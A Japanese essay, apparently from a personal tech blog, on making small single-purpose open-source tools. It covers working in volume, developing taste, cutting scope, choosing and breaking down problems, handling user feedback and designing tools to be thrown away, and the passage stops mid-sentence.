仕事では、AIに聞けば数分で方向性が見える。それに慣れた脳は、「答えが出ない状態」に耐えられなくなっている。では、どうすれば不確実さに耐えられるのか。いくつかの仮説がある。ゴールを小さくする（「Kubernetesのログ管理を改善したい」ではなく「Podの再起動ログをSlackに送る」）。「完成」の定義を下げる（動けば完成、READMEは3行でいい）。公開してしまう（不確実性の一部が確定に変わる）。AIに頼らない時間を作る（自分で考える筋力を維持する）。「狂う」とは何か「狂う」という言葉を使うと、何か特別な才能や突飛な発想が必要に思える。しかし、私が考える「狂う」はもっと単純だ。狂うとは、常識的な量を超えて、時間と労力を注ぐことだ。天才的なアイデアは必要ない。奇抜な発想も必要ない。ただ、普通の人が「そこまでやらなくていいだろう」と思う量を投入する。これが狂うということだ。しかし、ここまで書いて気づいた。「量をやれ」というアドバイスは、ゴールが見えている人へのアドバイスだ。これはポジティブケイパビリティの話だ。「OSSを20個作れ」と言われても、「何を作るか」が決まっていなければ、手は動かない。私の問題は、量が足りないことではなく、ゴールが見えない状態に耐えられないことだった。ネガティブケイパビリティの欠如だ。だから、「狂う」にはもう1つの意味がある。答えが出ない状態に留まり続けることだ。「これが正解かどうか分からない」「誰にも使われないかもしれない」「もっといい方法があるかもしれない」。その不確実さの中で、それでも作り続ける。確信がないまま、手を動かし続ける。普通の人は、不確実さに耐えられない。「これで合ってる？」と誰かに確認したくなる。確認できないと、手が止まる。狂っている人は、確認しないまま走り続ける。生成AIは「確認」を容易にした。コードを書いたら、AIにレビューしてもらえる。設計を考えたら、AIに壁打ちしてもらえる。これは素晴らしいことだ。でも同時に、「確認なしで走り続ける」筋力が衰えた。量を積むことと、不確実性に耐えること。この2つは、実は表裏一体だ。量を積めば、その中から「これだ」というものが見えてくる。不確実性に耐えていれば、やがてゴールが見えてくる。どちらも「狂う」ことでしか到達できない。狂気の最も簡単な表現方法は、物量か時間を使うことだ。1日1時間を5年続ける。同じテーマのブログを100本書く。OSSを年間20個作る。なぜ20個か。月に1〜2個のペースだ。1つのツールを2週間で完成させる。完璧じゃなくていい。動けばいい。このペースなら、仕事をしながらでも無理がない。かつ、「そこそこ止まり」の自分とは明らかに違う場所に立てる。特別な才能がなくても、量を積めば、誰も追いつけない場所にたどり着く。ここで「衝動」という言葉を使いたい。不便を見つけたとき、「あ、これ自動化できそう」と思う。その瞬間、手が動き出す。誰に頼まれたわけでもない。でも、気づいたらコードを書いている。これが私にとっての衝動だ。「将来の夢」とは違う。他者の評価を求めている「有名なOSSメンテナになりたい」は、衝動ではない。衝動は、評価とは無関係に動く。10年経っても変わらない。「不便を見つけたら、すぐ直したくなる」。隙間家具を作るのは、この衝動の表れだ。問題は、この衝動を他者の目で覆い隠してしまうことだ。「作っても誰にも使われないかも」。そう考えた瞬間、衝動が埋もれる。2025年の私は、まさにこれだった。衝動は「発見」するものではなく「掘り出す」ものだ。他者の目や評価への恐れで覆い隠されている。それを掘り出すには、まず量をやる必要がある。考える前に手を動かす。作る前に悩まない。作った後に、何が自分を動かしているのかが見えてくる。まず量をやる私たちは、最初から量が足りない。2025年、私のOSSがそこそこ止まりだった理由は何か。作った。完走もした。でも、「代表作」と呼べるインパクトには届かなかった。振り返ると、1つに賭け切れていなかった。あれもこれもやろうとして、どれにも全力を注げなかった。「ゴールが見えないから突き抜けられない」と思っていた。でも、それは逆だ。一つに賭け切らないから、ゴールが見えない。作りはした。でも、広く浅く。一つに集中しなかったから、どれも「これだ」に辿り着けなかった。私の経験を話す。以前、「Kubernetesのログをなんとかしたい」という漠然とした不満があった。何を作ればいいか分からなかった。とりあえず、Podの再起動を検知するスクリプトを書いた。動いた。使ってみた。すると、「再起動の直前のログが見たい」という次の不満が見えた。それを解決するコードを足した。使ってみた。今度は「Slackに通知したい」という欲求が出てきた。最初に「Podの再起動時に直前のログをSlackに送るツール」というゴールが見えていたわけではない。作っているうちに、ゴールが形成されていった。ゴールは、作る前に見つかるものではない。作る過程で見えてくるものだ。量をやることで、初めて「自分が本当に作りたいもの」が浮かび上がる。完璧な1つより、動く20個。磨き上げた1つより、荒削りな50個。これが私の2026年の方針だ。物量で狂う。 OSSを年間20個作る。完璧じゃなくていい。動けばいい。20個作れば、1個くらいは当たる。当たらなくても、20個分の経験が残る。時間で狂う。 毎日30分、何かを作る時間を確保する。1年で小さなツールを20個作れば、5年で100個になる。100個のOSSを持っているエンジニアは、採用市場で見たことがない。試行で狂う。 1つのアイデアに固執しない。「これは違うな」と思ったら、すぐ次に行く。打席に立つ回数を増やす。三振しても気にしない。次の打席がある。私は30代で独身だ。守るべきものが少ない。狂えるうちに狂っておく。量をやることで、初めて見えてくるものがある。どのアイデアに自分の熱量が続くのか。どのツールが使われるのか。作る前に「どれが正解か」を考えても分からない。作った後に、結果が教えてくれる。量だけでは足りないからセンスを磨くここで反論が聞こえる。「量をやるだけなら、生成AIでもできるのでは？」正しい指摘だ。そして、もう1つ重要な変化がある。ソフトウェアは供給過多の時代に入った。あらゆる領域で「フロンティアの閉鎖」が起きている。かつてソフトウェアには未開拓の荒野があった。問題はそこら中に転がっていて、誰かが手を挙げて解決すれば、それだけで価値になった。参入障壁が高かったから、作れる人が少なかった。だから「作った」という事実そのものに希少性があった。今は違う。生成AIが参入障壁を破壊した。誰でも作れる。結果、供給が需要を超えた。ユーザーの時間と注意力が、ツールよりも希少になった。ツールが人を選ぶ時代から、人がツールを選ぶ時代へ。選ばれないツールは、存在しないのと同じだ。これは「量で勝てた時代の終焉」を意味する。かつての戦略は「とにかく作れ、出せ、数で勝負しろ」だった。今、その戦略は逆効果になりうる。大量の凡庸なツールを公開すると、ノイズを増やすだけで、作り手の信用を毀損する。つまり、量を公開しすぎることが、むしろマイナスになる時代が来ている。では、量をやる意味はどこにあるのか。ここで「センス」について考えたい。センスとは何か。私は、意味よりも先に、形式やリズムを感じ取る能力だと考えている。普通、私たちは物事を「これは何を意味するのか」で理解しようとする。コードを見て「このツールは何をするのか」と問う。ブログを読んで「著者は何を主張しているのか」と問う。意味を求める。でも、センスの本質はそこにない。センスとは、意味の手前にある「リズム」を感じ取ることだ。リズムとは、反復と差異の織り成すパターンのことだ。赤ちゃんが「いないいないばあ」で喜ぶのは、不在から存在への移行、つまり0→1のビートを感じているからだ。予測があり、裏切りがあり、また予測に戻る。この往復運動が快感を生む。あらゆる表現にリズムがある。音楽のビート。文章の緩急。コードの構造。APIの応答パターン。人間は意味を理解する前に、このリズムを身体で感じている。優れた表現は、セオリーを押さえた上で、あえてそこからはみ出す。 反復の中に絶妙な差異を混ぜている。予測可能でありながら、どこか予測を裏切る。この「ズレ」がセンスだ。ここで重要な逆説がある。完璧を目指すほど、センスは死ぬ。お手本を完璧に再現しようとすると、二つの問題が起きる。一つは、お手本との差異が「欠点」に見えてしまうこと。もう一つは、自分固有のリズムが消えてしまうこと。結果として、劣化コピーが生まれる。逆に、お手本から離れることを肯定すると、「ヘタウマ」が生まれる。完璧ではないが、作り手固有のリズムがある。技術的には未熟でも、個性がある。その個性が、使う人に刺さる。なぜ個性が刺さるのか。人間は、パターンを認識する生き物だからだ。完璧にパターン化されたものは、最初は心地よい。でも、すぐ飽きる。予測通りすぎて、刺激がない。一方、パターンから少しズレたものは、脳に引っかかる。「なぜここでこうなる？」という小さな疑問が生まれ、それが記憶に残る。AIは反復とパターンを生成できる。しかし、その人固有の「どうしようもなさ」は生成できない。「どうしようもなさ」とは何か。個人の癖、偏り、こだわり。論理では説明できない選好。なぜか惹かれるもの。なぜか避けたくなるもの。この非合理な偏りが、人間の表現に陰影を与える。私がツールを作るとき、そこには私の「どうしようもなさ」が刻まれる。なぜこの設計を選んだのか、論理的に説明できない部分がある。それは私の経験、私の好み、私の盲点が複合的に作用した結果だ。AIが同じ仕様で作っても、同じものにはならない。センスとは、リズムを感じ取る能力であり、同時に、自分固有のリズムを表現する能力でもある。では、どうやってセンスを磨くのか。答えは逆説的だ。量をやることだ。多様なものに触れると、最初は不安を感じる。「分からない」「理解できない」。この不安は、パターンを認識できていないサインだ。量を重ねると、パターンが見えてくる。不安が面白さに変換される。これがセンスが磨かれる過程だ。ここで矛盾が生じる。センスを磨くには量が必要だ。しかし、量を公開しすぎるとマイナスになる。答えは、「作る量」と「公開する量」を分けることだ。20個作る。でも、公開するのは、センスが良いと判断した5個だけ。残りの15個は、センスを磨くための練習だ。公開しない。でも、作ったことに意味がある。量をやることには、二重の意味がある。1つ目は、センスを磨くこと。多様なものを作ることで、「何が良くて何が良くないか」を判断する回路ができる。リズムを感じ取る力が育つ。2つ目は、自分の「どうしようもなさ」を発見すること。量をやると、自分のパターンが見えてくる。どういう問題に惹かれるか。どういう設計を好むか。それは私の固有性であり、AIには真似できない。だから、量をやる意味は「AIより速く作る」ことではない。量を通じて、リズムを感じ取る力と、自分固有のリズムを発見することだ。そして、センスが磨かれた後は、公開するものを厳選する。供給過多の時代に求められるのは、「たくさん作れる人」ではない。「たくさん作った上で、良いものだけを選べる人」だ。AIは「どう作るか」を効率化する。でも、「何を作るか」「どれを公開するか」「どう判断するか」は、量を経験した人間にしか分からない。そして引き算する量をやった。20個作った。では、20個全部を維持できるか。できない。私には経験がある。かつて、複数のプロジェクトを同時に走らせていた。イシューは溜まり、プルリクエストは放置され、READMEは古くなった。全部やろうとして、全部が死んだ。量をやることと、量を維持することは違う。 量をやるのは一時的な狂気だ。量を維持するのは持続的な負担だ。人間のリソースは有限だから、量をやった後には、引き算という別の問題が待っている。私たちは、量が満ちた後に引かなすぎる。 量をやった後は、容赦なく削る。使われないツールは捨てる。熱量が続かないプロジェクトはアーカイブする。失うのは「いつかやるかもしれない」という幻想だ。守れるのは「今、本当にやりたいこと」への集中だ。削らずに広げ続けた結果が2025年の私だ。副業も、登壇も、ブログも、OSSも、全部やった。全部それなりに成果は出た。でも、どれも「これが俺の本業だ」と言い切れない。器用貧乏の完成形だ。ここで「引き算」の思考法が必要になる。シーナ・アイエンガー氏の有名な実験では、24種類のジャムより、6種類に絞った方が購入率は高かった。選択肢が多すぎると、人は「選ぶ」という行為自体ができなくなる。選択の科学 コロンビア大学ビジネススクール特別講義 (文春文庫 S 13-1)作者:シーナ アイエンガー文藝春秋Amazonアイエンガー氏は『THINK BIGGER』で、選択肢が多すぎて選べないときの思考法を体系化した。その本質は「引き算」だ。課題を選ぶ、分解する、誰のためかを決める、材料を集める、何を作らないかを決める、他者の目で検証する。すべて「絞る」プロセスだ。THINK BIGGER 「最高の発想」を生む方法：コロンビア大学ビジネススクール特別講義 (NewsPicksパブリッシング)作者:シーナ・アイエンガーニューズピックスAmazon狂って量をやるフェーズでは、複数のアイデアが同時に走っている方が自然だ。順番通りに1つずつ片付けようとすると、むしろ手が止まる。どれかが熱を帯びてきたら、そこに集中する。足し算ではない。引き算だ。優れた開発者のOSSが失敗するのは、怠けているからではない。正しいことをしすぎるからだ。 ユーザーの声を聞く。機能を追加する。対応範囲を広げる。全部、正しいことだ。でも、正しいことを積み重ねた結果、複雑になり、重くなり、新しく登場したシンプルなツールに足元をすくわれる。私たちは「正しさ」に殺される。ユーザーの声を聞くのは正しい。だから聞く。機能を追加するのは正しい。だから追加する。テストを書くのは正しい。だから書く。ドキュメントを整えるのは正しい。だから整える。気づいたら、最初に解決したかった問題が見えなくなっている。正しいことの山に埋もれて、本質が窒息している。「正しさ」は麻薬だ。やればやるほど気持ちいい。やればやるほど、完成から遠ざかる。隙間家具を作るとは、引き算をすることだ。機能を削る。対象を絞る。スコープを小さくする。「これだけは解決する」を決め、残りは捨てる。生成AIを使うとき、この引き算が難しくなる。AIは指示すれば無限に足し算を提案してくる。「この機能も追加しましょうか」「こういうオプションもあると便利です」「エラーハンドリングをもっと丁寧にしましょう」。全部、正しい提案だ。でも、全部受け入れると、隙間家具は大きな家具になる。AIは足し算が得意だ。引き算は人間がやる。私がAIに「削らせる」ときに使う問いかけがある。「この機能がなくても、最小限の価値は提供できるか？」。答えがYESなら、その機能は削る候補だ。AIの提案を聞いたら、「本当に必要か？」と問い直す。これが、AIとの協働における引き算の基本姿勢だ。「何を作るか」を決める課題を選ぶ引き算の最初は、「何を作るか」を1つに決めることだ。私が2025年に「代表作」に届かなかった理由の1つは、課題が大きすぎたことだ。「Kubernetesのログ管理を改善したい」と思った。でも、それは「どのログ」「どう改善」「誰のため」が決まっていない。漠然としすぎていた。結果、インパクトのあるものが作れなかった。「作りたいものはあるけど、何から手をつければ...」という状態は、課題が大きすぎるか小さすぎるかのどちらかだ。大きすぎると作りきれない。小さすぎると作る意味がない。「1つのツールで完結する」サイズを探す。課題が大きすぎる例:「Kubernetesの代替」「CI/CDパイプライン全体の改善」「インフラ自動化ツール」課題が小さすぎる例:「kubectl getのラッパー」「特定のエラーメッセージを整形するスクリプト」ちょうどいい例:「Podが再起動したときに直前のログを保存するツール」「複数リポジトリのCIステータスを一覧表示するCLI」「Terraformの差分をSlackに見やすく投稿するBot」ちょうどいいサイズの見つけ方は、「自分が1〜3日かけて解決したこと」を思い出すことだ。それは、深みがある。かつ、1つのツールで完結する気がする。隙間を見つける大きなツールが解決していない小さな問題。それが「隙間」だ。Kubernetes（コンテナオーケストレーション）は素晴らしい。しかし、Kubernetesが解決していない問題は山ほどある。Podが再起動したとき、前後のログを自動でSlack に送りたい。これはKubernetesの仕事ではない。Terraform（インフラ構成管理）も素晴らしい。ただ、差分をSlackに見やすく投稿したい。これはTerraformの仕事ではない。GitHubも同様だ。複数リポジトリのCIステータスを一覧で見たい。これはGitHubの仕事ではない。隙間を見つけるヒントは5つある。自分の不便。「こういうツールが欲しいのに、ない」という体験。私が作った隙間家具の中で、最も使われたものは、自分自身の問題を解決するために作ったものだった。自分が不便を感じているとき、そこには片づけたい「用事」がある。でも、それを片づける手段がない。私のGithub リポジトリからのスクショここで疑問が浮かぶ。「自分の不便」が特殊すぎるときはどうするのか。自分だけが困っている問題を解決しても、誰も使わないのではないか。だから2026年、私はこう決めた。最初は特殊すぎて構わない。なぜなら、特殊な問題を解決するツールでも、自分が本当に使うなら完成する。「誰かが使うかも」で作ったツールは、途中で手が止まる。まず完成させることが最優先だ。公開してみれば、同じ問題を抱えている人が意外といることに気づく。特殊だと思っていた不便が、実は普遍的だったというケースは多い。仮に本当に特殊で誰も使わなくても、自分の問題は解決している。それで十分だ。繰り返しの手作業。同じコマンドを何度も打っている。同じ手順を何度も実行している。毎回「面倒だな」と思いながら、やっている。ここで立ち止まる。この問題は「自動化すべき問題」か、それとも「慣れるべき問題」か。ツール化することで、本当に人間の負荷は減るのか。自動化によって、別の複雑さを生んでいないか。判断基準は、その作業が月に何回・何分発生しているかだ。月に1回、5分で終わる作業なら、自動化ツールを作るより慣れた方が早い。週に10回、毎回10分かかる作業なら、自動化する価値がある。感覚で判断しない。数字で判断する。例えば、複数のGitHubリポジトリのCIステータスを確認するとき、1つずつページを開いていた。毎回、5分くらいかかる。週に5回やっていた。月に100分。年に1200分。ツールを作る価値がある。作った。5分が10秒になった。コンテキストスイッチ。ある情報を得るために、複数のツールを行き来している。Slackを見て、Grafanaを見て、ログを見て、またSlackに戻る。情報を一箇所に集めるツールを作れば、コンテキストスイッチが減る。頭の負荷が減る。判断が速くなる。暗黙知。「あの人に聞けば分かる」「Slackのどこかにある」「この手順は、前にやったことある人しか知らない」。暗黙知をツールに埋め込めば、誰でも同じことができるようになる。複雑さ。「このツールは高機能だけど、使いこなせない」「設定項目が多すぎて、何を設定すればいいか分からない」。高機能なツールが、その機能を使い切れていない人たちを置き去りにしている。彼らに、シンプルで分かりやすい選択肢を提供する。これも隙間家具の仕事だ。課題を分解する課題が決まったら、5つまでに分解する。私がよくやる失敗は、分解せずに作り始めることだ。「ログ保存ツールを作ろう」と思って、いきなりコードを書き始める。途中で「保存先どうしよう」「認証どうしよう」「エラーハンドリングどうしよう」と考え始める。そのたびに手が止まる。最初に分解しておけば、こうはならない。「〇〇を作ろう」だけでは手が動かない。サブ課題に分解して、5つまでに絞る。5つに絞るのは、正直、苦しい。あれもこれも入れたくなる。でも、ジャムの法則と同じだ。サブ課題を10個、20個と出すと、どれに注力すべきか分からなくなる。例: 「Podが再起動したときに直前のログを保存するツール」Podの再起動を検知する仕組み直前のログを取得する方法ログを保存する先（S3など）CLIのインターフェースエラーハンドリング分解した項目が、そのまま実装の順番になる。「これは本当に必要か？」と自問すると、いろいろ見えてくる。実は同じことをしている項目。なくても動く項目。別のツールに任せた方がいい項目。削ることで本質が見える。5つに分解したら、次に優先順位をつける。何を基準に「残す1つ」と「後回しにする4つ」を決めるか。私の基準は、「これがないと、ツールとして成立しない」だ。技術的な実現性でも、ユーザーの感動でも、自分の興味でもない。「ツールの存在意義に関わるか」だ。例えば、「Podの再起動を検知する仕組み」がなければ、ログ保存ツールは成立しない。これが最優先だ。「CLIのインターフェース」は後でもいい。最初はハードコードでも動く。ここまでで、「何を作るか」と「どう分解するか」が決まった。でも、まだ足りない。「誰のために作るか」が決まっていない。「誰のために作るか」を決める望みを比較する同じツールでも、誰向けに作るかで設計が変わる。自分用なら雑でいい。他人に使ってもらうなら、READMEが必要だ。コミュニティに貢献したいなら、テストも書く。私が2025年に「代表作」に届かなかったもう1つの理由は、「誰のため」が曖昧だったことだ。「これ、公開したら使ってもらえるかな」と考えた瞬間、設計が複雑になる。「あの人はこういう使い方するかも」「この環境もサポートした方がいいかも」。考えれば考えるほど、作るものが膨らむ。膨らめば膨らむほど、作れなくなる。3つの望みがある。自分が作りたいもの。ユーザーが使いたいもの。コミュニティへの貢献。全部満たそうとすると、どれも中途半端になる。だから2026年、私はこう決断する。まず自分の問題を解決するツールを作る。当たり前すぎるかもしれない。でも、これが私の経験則だ。自分が本当に困っている問題なら、熱量が出る。熱量のあるツールは、ユーザーにも伝わる。これは「プロダクト」ではなく「道具」として十分に割り切れているか。プロダクトは他者のためにある。道具は自分のためにある。隙間家具は道具だ。自分の問題を解決するために作る。他者が使ってくれたらラッキー、くらいの気持ちでいい。汎用性を上げようとして、複雑さを持ち込んでいないか。持ち込みがちだ。「S3だけじゃなくGCSにも対応しよう」「Kubernetes以外でも使えるようにしよう」。その瞬間、道具がプロダクトになろうとする。複雑さが増す。完成しなくなる。READMEは「思想」ではなく「使い方」を語っているか。思想を語りがちだ。「なぜこのツールが必要か」「どんな設計思想か」。でも、ユーザーが知りたいのは「どう使うか」だ。インストール方法、実行方法、オプション。これだけでいい。自分以外の利用者がゼロでも、このツールは成立しているか。成立している必要がある。自分の問題が解決しているなら、それで十分だ。他者が使うかどうかは、結果論だ。「まだ誰も使っていない人」を見る自分が不便を感じているとき、同じ不便を感じている人は他にもいる。片づけたい用事があるのに、それを片づける手段を持っていない人。私はこの人たちを「まだ誰も使っていない人」と呼んでいる。自分がその一人だったなら、同じ境遇の人が他にもいるだろう。隙間家具は、この人たちに届ける。ここで注意が必要だ。ツールを公開すると、ユーザーからフィードバックが来る。「この機能が欲しい」「ここが使いにくい」。これは嬉しい。でも、ここに罠がある。既存ユーザーの声を聞けば聞くほど、既存ユーザーのためのツールになる。そして、「まだ誰も使っていない人」を見落とす。既存ユーザーの声に応え続けると、隙間家具は大きな家具になろうとし始める。機能が増え、複雑になり、最初のシンプルさを失う。新規ユーザーが求めているのは、高機能ではなく「すぐ使える」「分かりやすい」だ。「声」と「用事」を区別するフィードバックを受けるとき、「声」と「用事」を区別する。私も失敗したことがある。あるCLIツールを公開したとき、「設定ファイルで動作を変えたい」というフィードバックを複数もらった。嬉しかった。使ってくれている人がいる。だから、設定ファイル機能を実装した。YAMLで書けるようにした。オプションを増やした。結果、設定項目が20個を超えた。新しいユーザーは「設定が多すぎて何を設定すればいいか分からない」と言い始めた。シンプルさが売りだったツールは、複雑なツールになっていた。「声」は、ユーザーが言語化したものだ。「この機能が欲しい」「ここが使いにくい」。「用事」は、ユーザーが本当に片づけたいことだ。なぜその機能が欲しいのか。なぜそこを使いにくいと感じるのか。この「なぜ」の先に、本当の用事がある。例えば、CLIツールに「YAML出力オプションが欲しい」というフィードバックが来たとする。声をそのまま受け取れば、--output yamlフラグを実装することになる。でも、「なぜYAMLが欲しいのか」を問うと、「他のツールにパイプしたい」「設定ファイルとして保存したい」という用事が見えてくる。用事が分かれば、YAMLだけでなくJSONでも解決できるだろう。あるいは、標準出力をそのままパイプできる設計にすれば、フォーマット変換はjqに任せられるだろう。「この機能が欲しい」と言われたら、「なぜ」を問う。その人の用事は何か。その用事を片づける方法は、言われた機能だけか。もっとシンプルな方法はないか。ツールがヒットすると、「汎用化」の要望が必ず来る。「S3だけでなくGCSにも対応して」「Kubernetes以外でも使えるようにして」。これに応えると、隙間家具は大きな家具になる。だから私は、こう決めている。READMEが複雑になるなら、その機能は入れない。機能を追加するとき、READMEがどう変わるかを見る。説明が長くなるなら、別のツールにする。READMEがシンプルなら、ツールもシンプルだ。これが私の制約であり、美学だ。ここまでで、「何を作るか」「誰のために作るか」が決まった。次は、作る前に調べる。調べて、削る箱の中と外を探すいきなり作り始めたくなる。でも、その前に下調べをする。私は以前、「これ、俺が作らなくても既存ツールで十分だな」と気づいて手を止めたことがある。それ自体は正しい判断だった。でも、その後「じゃあ俺の経験は何に使えるか」を考えなかった。既存ツールを調べて終わり。それでは何も生まれない。似たツールはあるか。どんなアプローチがあるか。先人の知恵を借りる。「箱の中」は同じ領域の情報だ。公式ドキュメント、他の人の同じテーマのツール、GitHub Issues、Stack Overflow。正確性を担保し、抜け漏れを防ぐ。「箱の外」は自分の経験だ。実際に試した結果、ハマったポイントと解決策、自分なりの工夫や改善。これがオリジナリティの源泉になる。ここで重要なのは、インプットだ。本を読む。既存のOSSのコードをちゃんと読む。何のライブラリが使われていて、どのように問題を解決しているかを理解する。これが「箱の中」を深く知ることだ。例えば、Kubernetesのログ保存ツールを作るなら、既存の類似ツールのコードを読む。どのKubernetesクライアントライブラリを使っているか。どうやってPodの再起動を検知しているか。ログの取得にはどのAPIを使っているか。保存先との接続はどう抽象化しているか。コードを読まずに作り始めると、車輪の再発明をする。既に解決されている問題を、苦労して解き直す。あるいは、先人が避けた落とし穴にハマる。インプットの具体例を挙げる。本を読む：技術書だけでなく、設計思想やアーキテクチャの本も読む。『A Philosophy of Software Design』『The Art of Unix Programming』。隙間家具を作る視点が変わる。OSSのコードを読む：GitHubで似たツールを探して、main.goやlib.rsを読む。README だけでなく、実装を見る。「なるほど、こう解決するのか」という発見がある。ライブラリの使い方を学ぶ：使おうとしているライブラリのexampleを全部読む。ドキュメントを端から端まで読む。「こんな機能もあったのか」という発見が、設計を変える。「既に同じようなツールがある」は気にしない。同じ課題を解決するツールでも、価値を出せる理由はある。環境が違う。文脈が違う。深さが違う。切り口が違う。あなたのツールにしかない価値は、あなたの環境で動いた事実、あなたがハマったポイント、あなたの言葉での説明だ。「n番煎じ」でも、あなたの経験を加えれば価値になる。「箱の外」の材料を増やすために、私が意識的にやっていることがある。「自分の仕事を観察する」だ。エンジニアリング以外のインプットも大事だが、それ以上に、自分が日常的にやっている作業を観察する。「今、何に時間を使っているか」「何に苛立っているか」「何を繰り返しているか」。この観察が、隙間を見つける材料になる。選択マップで削る材料が揃ったら、「何を作り、何を作らないか」を選ぶ。私は「全部入り」を目指しがちだ。ログ保存ツールを作るなら、S3もGCSもAzure Blobも対応したくなる。Slack通知もメール通知もつけたくなる。そうこうしているうちに、何も作れなくなる。選択マップとは、集めた選択肢を視覚的に整理し、最適な組み合わせを見つける方法だ。課題から分岐して選択肢を並べ、各選択肢のメリット・デメリットを可視化する。例: 「OOMKilled（メモリ不足による強制終了）の調査方法を紹介するツール」調査方法は複数ある。kubectl top（リソース使用状況確認）、Grafana（可視化ダッシュボード）、pprof（プロファイリングツール）、サードパーティツール。読者に最も役立つのはどれか。kubectl topは簡単ですぐ使えるが、瞬間値しか見られない。Grafanaは履歴を見られるが、セットアップが必要。pprofは詳細に分析できるが、設定が必要で学習コストは高い。選択結果：読者の多くは「まず何が起きてるか知りたい」→ kubectl top + Grafanaを中心に作る。pprofは発展編として軽く触れるか、別のツールにする。足し算の発想だと、全部の方法をサポートしようとする。焦点がぼやける。誰にも刺さらない。引き算の発想だと、「これだけは作る」を決める。残りは捨てる。刺さるツールになる。良いツールは「何を作らないか」で決まる。スコープを絞る勇気隙間家具は、特定の問題を解決する。汎用性を追求しない。「このコンテキストで、この問題を解決する」に集中する。例えば、「KubernetesのPodが再起動したとき、直前のログを自動でS3に保存するツール」。汎用的ではない。Kubernetesを使っていて、ログをS3に保存したい人だけを対象にする。でも、それでいい。特定の問題を、特定のコンテキストで、確実に解決する。これが隙間家具の価値だ。汎用性は、使われてから考えればいい。最初から汎用的に作ろうとすると、要件が膨らみ、複雑になり、いつまでも完成しない。ここまでで、何を作るか、誰のために作るか、何を作らないかが決まった。いよいよ作る。小さく作って、見せる第三の目で検証する作った。動いた。自分では完璧に見える。でも、それは危険なサインなんだ。私にも経験がある。あるCLIツールを作って、自分では「完璧だ」と思った。README も書いた。インストール方法も書いた。でも、同僚に見せたら「これ、何をするツールなの？」と聞かれた。私には当たり前すぎて、説明を省略していた。「前提知識がないと、何も分からない」。そのツールは結局、私しか使わなかった。使い方を説明する手間を惜しんだ結果だ。作った本人には見えない穴がある。「当然わかるでしょ」と省略している。専門用語を説明なしで使っている。論理の飛躍に気づかない。自分では完璧に見える。だから、他者に見せる。使ってもらう。フィードバックをもらう。隙間家具を必要としている人は、探していない。問題を抱えているが、解決策があるとは思っていない。だから、「検索してたどり着く」ことを期待できない。では、どうやって届けるか。自分の体験を語る。「私はこういう問題を抱えていた。だから、このツールを作った。」「まだ誰も使っていない人」は、同じ問題を抱えているだろう。ブログやTwitterで体験を語れば、「あ、自分もこの問題を抱えている」と思ってもらえる。READMEに機能を列挙するだけでは届かない。「なぜこのツールを作ったか」「どんな問題を解決するか」を語る。「まだ誰も使っていない人」は、自分の不便を言語化できていないことが多い。だから、状況を描写する。「毎朝、Slackを開いて、Grafanaに移動して、ログを確認して、またSlackに戻る...この作業、面倒じゃないですか？」。機能ではなく、状況を語る。「あ、それ自分だ」と思わせる。ツールの説明ではなく、問題の描写から始める。これが、言語化できていない不便に気づかせるストーリーテリングだ。入り口を簡単にするインストールが面倒だと、人は離れる。設定が複雑だと、人は離れる。最初の一歩を、できるだけ簡単にする。go install 一発でインストールできる。設定ファイルは最小限。デフォルトで動く。これが理想だ。なぜなら、新しいツールを試すとき、人は「動かすまでの時間」を無意識に測っている。5分で動かなければ、「また今度」になる。設定が多いツールは、5分では動かない。だから、試されずに終わる。パワーユーザーは細かい設定を求めるだろう。でも、パワーユーザーは「まだ誰も使っていない人」ではない。最初に届けるべきは、5分で動くシンプルさだ。新しいツールは、最初は既存のツールより「劣っている」ことが多い。機能が少ない。パフォーマンスが低い。でも、シンプルで、分かりやすくて、すぐに使える。それでいい。隙間家具は、シンプルでいい。1つのことを、確実にやる。それが、「まだ誰も使っていない人」に届く。「ジャムの法則」をインターフェースにも適用する。CLIツールなら、フラグを減らす。理想は、引数なしで動くこと。mytoolと打てば、最も一般的なユースケースが実行される。設定が必要なら、対話的に聞く。フラグは上級者向けのショートカットだ。最初から覚えてもらうものではない。選択肢を減らすことで、ユーザーは「考える」から「使う」にすぐ移れる。このツールは「技術的に正しい」より「現場で生き残る」設計になっているか。技術的に正しい設計は、しばしば複雑になる。すべてのエッジケースに対応する。すべてのエラーを丁寧にハンドリングする。でも、現場で使われるツールは、シンプルで、雑でも動く。エッジケースを切り捨てた理由を説明できるか。説明できる必要がある。「このケースは月に1回しか発生しない。手動で対応すればいい。だから、ツールでは対応しない。」こう言い切れるなら、切り捨てていい。例外処理より「何も起きないこと」を優先していないか。優先していい。エラーが発生したとき、丁寧なエラーメッセージを出すより、そもそもエラーが発生しない設計の方がいい。入力を厳しくする。想定外の状態を作らない。現場の雑さ・曖昧さ・不完全さを前提にできているか。現場は綺麗ではない。設定ファイルにtypoがある。環境変数が設定されていない。ネットワークが不安定。この雑さを前提に設計する。「完璧な環境でしか動かないツール」は、現場では使われない。小さく始める6ステップを踏んでも、完璧なツールは作れない。だから、小さく始める。最初から完璧なツールを作ろうとしない。自分の問題を解決するスクリプトから始める。それが動いたら、少し整えて公開する。私の場合、多くの隙間家具は、最初はただのシェルスクリプトだった。自分の問題を解決するために、ちょっと書いた。それが便利だったので、もう少し整えた。それを公開した。完璧を目指すと、いつまでも公開できない。「もう少し機能を追加してから」「もう少しドキュメントを整えてから」。そうこうしているうちに、作る気力がなくなる。動くものを、まず作る。公開する。使ってもらう。フィードバックをもらう。改善する。このサイクルを回す。隙間家具を1つ公開したら、終わりではない。むしろ、ここからが始まりだ。探索を続ける捨てやすく作るここからが、私が一番伝えたいことだ。隙間家具には寿命がある。状況が変われば、不要になる。だから、捨てやすく作る。このツールは「自分が将来保守したいコード」になっているか。正直に言えば、保守したくないコードの方が多い。だから、捨てやすく作る。保守したくなるほど愛着が湧くツールは、20個に1個くらいでいい。半年後の自分が読んで理解できる設計になっているか。なっていなくてもいい。半年後に必要なら、そのとき書き直せばいい。必要なければ、捨てればいい。機能追加ではなく「削除」するとしたら、どこを真っ先に消すか。この問いを常に持っておく。削除できる部分があるなら、それは最初から作らなくてよかった部分かもしれない。このコードは、使われなくなったときに綺麗に捨てられるか。捨てられる設計にしておく。依存を少なく。外部サービスとの結合を弱く。捨てるときに、誰にも迷惑がかからないように。私が作ったツールの中で、すでに捨てたものがある。Kubernetesをインストールするツールを作っていた。当時、Kubernetesのインストールは複雑で、手順を間違えると動かなかった。だから、自動化ツールを作った。便利だった。でも、kubeadmがリリースされて、インストールが簡略化された。ツールは不要になった。リポジトリをアーカイブした。悲しくはなかった。むしろ、「自分の問題意識は正しかった」と思えた。Kubernetesの開発者も同じ問題を認識していたのだから。このOSSは「本流に取り込まれる未来」を想定できているか。想定しておく。もしKubernetesやTerraform本体に同等